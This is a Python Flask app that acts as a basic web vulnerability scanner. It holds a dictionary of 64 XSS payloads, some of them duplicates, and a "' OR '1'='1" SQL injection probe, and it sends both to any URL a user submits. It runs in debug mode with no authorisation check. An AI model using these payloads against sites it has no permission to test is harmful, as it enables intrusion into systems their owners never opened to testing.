from flask import Flask, render_template, request
import requests
 #XSS payloads dictionary
xss_dict = {
    "x1": "<script>alert('XSS');</script>",
    "x2": "<img src='x' onerror='alert(\"XSS\");'>",
    "x3": "<iframe src='javascript:alert(\"XSS\");'></iframe>",
    "x4": "<input type='text' value='<script>alert(\"XSS\");</script>'>",
    "x5": "<body onload='alert(\"XSS\");'>",
    "x6": "<link rel='stylesheet' href='javascript:alert(\"XSS\");'>",
    "x7": "<a href='javascript:alert(\"XSS\");'>Click me</a>",
    "x8": "<form action='javascript:alert(\"XSS\");'>",
    "x9": "<div onmouseover='alert(\"XSS\");'>Hover over me</div>",
    "x10": "<button onclick='alert(\"XSS\");'>Click me</button>",
    "x11": "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\");'>",
    "x12": "<svg onload='alert(\"XSS\");'></svg>",
    "x13": "<object data='javascript:alert(\"XSS\");'></object>",
    "x14": "<embed src='javascript:alert(\"XSS\");'>",
    "x15": "<base href='javascript:alert(\"XSS\");'>",
    "x16": "<audio src='javascript:alert(\"XSS\");'></audio>",
    "x17": "<video src='javascript:alert(\"XSS\");'></video>",
    "x18": "<details ontoggle='alert(\"XSS\");'></details>",
    "x19": "<img src='x' onload='alert(\"XSS\");'>",
    "x20": "<img src='x' onerror='alert(\"XSS\");'>",
    "x21": "<button onclick='alert(\"XSS\");'>Click me</button>",
    "x22": "<div onmouseover='alert(\"XSS\");'>Hover over me</div>",
    "x23": "<input onfocus='alert(\"XSS\");'>",
    "x24": "<input onblur='alert(\"XSS\");'>",
    "x25": "<input onchange='alert(\"XSS\");'>",
    "x26": "<form onsubmit='alert(\"XSS\");'>",
    "x27": "<form onreset='alert(\"XSS\");'>",
    "x28": "<marquee onstart='alert(\"XSS\");'>Scrolling text</marquee>",
    "x29": "<bgsound src='javascript:alert(\"XSS\");'>",
    "x30": "<basefont face='javascript:alert(\"XSS\");'>",
    "x31": "<isindex action='javascript:alert(\"XSS\");'>",
    "x32": "<textarea onfocus='alert(\"XSS\");'></textarea>",
    "x33": "<frame src='javascript:alert(\"XSS\");'>",
    "x34": "<frameset onload='alert(\"XSS\");'></frameset>",
    "x35": "<noframes onload='alert(\"XSS\");'></noframes>",
    "x36": "<applet code='javascript:alert(\"XSS\");'></applet>",
    "x37": "<b onmouseover='alert(\"XSS\");'>Bold text</b>",
    "x38": "<u onclick='alert(\"XSS\");'>Underlined text</u>",
    "x39": "<i onmouseover='alert(\"XSS\");'>Italic text</i>",
    "x40": "<center onmouseover='alert(\"XSS\");'>Centered text</center>",
    "x41": "<span onclick='alert(\"XSS\");'>Span text</span>",
    "x42": "<blink onmouseover='alert(\"XSS\");'>Blinking text</blink>",
    "x43": "<font onmouseover='alert(\"XSS\");'>Font text</font>",
    "x44": "<tt onmouseover='alert(\"XSS\");'>Typewriter text</tt>",
    "x45": "<kbd onmouseover='alert(\"XSS\");'>Keyboard text</kbd>",
    "x46": "<samp onmouseover='alert(\"XSS\");'>Sample text</samp>",
    "x47": "<var onmouseover='alert(\"XSS\");'>Variable text</var>",
    "x48": "<abbr onmouseover='alert(\"XSS\");'>Abbreviated text</abbr>",
    "x49": "<cite onmouseover='alert(\"XSS\");'>Cited text</cite>",
    "x50": "<input onkeydown='alert(\"XSS\");'>",
    "x51": "<input onkeydown='alert(\"XSS\");'>",
    "x52": "<input onkeypress='alert(\"XSS\");'>",
    "x53": "<input onkeyup='alert(\"XSS\");'>",
    "x54": "<input oninput='alert(\"XSS\");'>",
    "x55": "<input onpaste='alert(\"XSS\");'>",
    "x56": "<input oncopy='alert(\"XSS\");'>",
    "x57": "<input oncut='alert(\"XSS\");'>",
    "x58": "<div oncontextmenu='alert(\"XSS\");'>Right-click me</div>",
    "x59": "<div onmouseenter='alert(\"XSS\");'>Enter me</div>",
    "x60": "<div onmouseleave='alert(\"XSS\");'>Leave me</div>",
    "x61": "<div onmousedown='alert(\"XSS\");'>Mouse down</div>",
    "x62": "<div onmouseup='alert(\"XSS\");'>Mouse up</div>",
    "x63": "<div onwheel='alert(\"XSS\");'>Scroll me</div>",
    "x64": "<div ondrop='alert(\"XSS\");'>Drop here</div>"
    
    
}
app = Flask(__name__)


def check_xss(url):
    for key, xss_test_script in xss_dict.items():
        response = requests.get(url, params={"q": xss_test_script})
        if xss_test_script in response.text:
            return True
    return False

def check_sql_injection(url):
    sql_test_payload = "' OR '1'='1"
    response = requests.get(url, params={"id": sql_test_payload})
    if "sql" in response.text.lower():
        return True
    return False

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        url = request.form.get("url")
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        xss_vulnerable = check_xss(url)
        sql_injection_vulnerable = check_sql_injection(url)
        return render_template("result.html", url=url, xss=xss_vulnerable, sql=sql_injection_vulnerable)
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
